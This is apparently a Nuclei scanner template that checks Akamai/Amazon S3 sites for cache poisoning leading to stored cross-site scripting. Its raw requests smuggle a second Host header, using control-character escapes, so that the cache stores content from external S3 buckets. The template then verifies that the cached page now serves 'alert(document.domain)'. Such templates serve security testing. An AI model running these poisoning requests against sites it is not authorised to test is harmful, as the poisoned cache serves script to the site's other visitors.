id: akamai-s3-cache-poisoning

info:
  name: Akamai/Amazon S3 - Cache Poisoning
  author: DhiyaneshDk, Omkar7505
  severity: high
  description: Akamai/Amazon S3 expose a stored cross-site scripting vulnerability generated by cache poisoning capability. An attacker can inject arbitrary script in the browser of an unsuspecting user in the context of the affected site, which can further allow the attacker to steal cookie-based authentication credentials and launch other attacks.
  reference:
    - https://web.archive.org/web/20230101082612/https://spyclub.tech/2022/12/14/unusual-cache-poisoning-akamai-s3/
    - https://owasp.org/www-community/attacks/Cache_Poisoning
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L
    cvss-score: 7.1
    cwe-id: CWE-44
  metadata:
    verified: true
    max-request: 204
  tags: cache,poisoning,xss,akamai,s3,misconfig
variables:
  rand: "{{rand_base(5)}}"

http:
  - raw:
      - |+
        GET /nuclei.svg?{{rand}}=x HTTP/1.1
        Host: {{Hostname}}
        {{escape}}Host: {{bucket}}

      - |+
        GET /nuclei.svg?{{rand}}=x HTTP/1.1
        Host: {{Hostname}}

    attack: clusterbomb
    payloads:
      escape:
        - "\v"
        - "\f"
        - "\x1c"
        - "\x1d"
        - "\x1e"
        - "\x1f"
      bucket:
        - "nuclei-ap-northeast-1.s3-ap-northeast-1.amazonaws.com"
        - "nuclei-ap-northeast-2.s3-ap-northeast-2.amazonaws.com"
        - "nuclei-ap-northeast-3.s3-ap-northeast-3.amazonaws.com"
        - "nuclei-ap-south-1.s3-ap-south-1.amazonaws.com"
        - "nuclei-ap-southeast-1.s3-ap-southeast-1.amazonaws.com"
        - "nuclei-ap-southeast-2.s3-ap-southeast-2.amazonaws.com"
        - "nuclei-ca-central-1.s3-ca-central-1.amazonaws.com"
        - "nuclei-eu-central-1.s3-eu-central-1.amazonaws.com"
        - "nuclei-eu-north-1.s3-eu-north-1.amazonaws.com"
        - "nuclei-eu-west-1.s3-eu-west-1.amazonaws.com"
        - "nuclei-eu-west-2.s3-eu-west-2.amazonaws.com"
        - "nuclei-eu-west-3.s3-eu-west-3.amazonaws.com"
        - "nuclei-sa-east-1.s3-sa-east-1.amazonaws.com"
        - "nuclei-us-east-2.s3-us-east-2.amazonaws.com"
        - "nuclei-us-west-1.s3-us-west-1.amazonaws.com"
        - "nuclei-us-west-2.s3-ap-west-2.amazonaws.com"
    stop-at-first-match: true
    unsafe: true
    matchers:
      - type: dsl
        dsl:
          - 'contains(body_2, "alert(document.domain)")'
          - 'status_code_2 == 200'
        condition: and

